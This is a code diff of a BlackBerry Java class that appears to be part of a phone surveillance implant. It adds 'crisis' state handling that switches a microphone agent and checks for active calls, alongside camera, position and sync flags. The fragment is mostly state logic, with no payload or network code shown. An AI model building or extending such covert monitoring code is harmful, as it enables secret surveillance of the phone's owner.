@@ -12,10 +12,14 @@ package blackberry;
 import java.util.Enumeration;
 import java.util.Vector;
 
+import net.rim.blackberry.api.phone.Phone;
+import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.IntHashtable;
 import blackberry.action.Action;
 import blackberry.agent.Agent;
+import blackberry.agent.CrisisAgent;
+import blackberry.agent.MicAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
@@ -83,8 +87,7 @@ public final class Status implements Singleton {
 
     IntHashtable triggeredAction = new IntHashtable();
 
-	public boolean synced;
-
+    public boolean synced;
 
     /**
      * Instantiates a new status.
@@ -262,8 +265,50 @@ public final class Status implements Singleton {
      * @return true, if successful
      */
     public synchronized boolean crisis() {
-
         return crisis;
+    }
+
+    private int crisisType;
+
+    public synchronized void setCrisis(int type) {
+        crisisType = type;
+
+        Agent agent = getAgent(Agent.AGENT_MIC);
+        if (agent != null) {
+            MicAgent micAgent = (MicAgent) agent;
+            micAgent.crisis(crisisMic());
+        }
+
+    }
+
+    public boolean callInAction() {
+        PhoneCall phoneCall = Phone.getActiveCall();
+        return phoneCall != null
+                && phoneCall.getStatus() != PhoneCall.STATUS_DISCONNECTED;
+    }
+
+    private synchronized int getCrisis(int type) {
+        return type;
+    }
+
+    public synchronized boolean crisisPosition() {
+        return (crisis & (crisisType & CrisisAgent.POSITION) != 0);
+    }
+
+    public synchronized boolean crisisCamera() {
+        return (crisis & (crisisType & CrisisAgent.CAMERA) != 0);
+    }
+
+    public synchronized boolean crisisCall() {
+        return (crisis & (crisisType & CrisisAgent.CALL) != 0);
+    }
+
+    public synchronized boolean crisisMic() {
+        return (crisis & (crisisType & CrisisAgent.MIC) != 0);
+    }
+
+    public synchronized boolean crisisSync() {
+        return (crisis & (crisisType & CrisisAgent.SYNC) != 0);
     }
 
     /**
@@ -550,12 +595,12 @@ public final class Status implements Singleton {
         debug.trace("TriggerAction:" + actionId);
         //#endif
 
-        if(isRestarting()){
+        if (isRestarting()) {
             //#ifdef DEBUG_WARN
             debug.warn("TriggerAction: not triggered, restarting.");
             //#endif
         }
-        
+
         if (actionId != Action.ACTION_NULL && actions.containsKey(actionId)) {
             final Action action = (Action) actions.get(actionId);
             action.setTriggered(true, event);
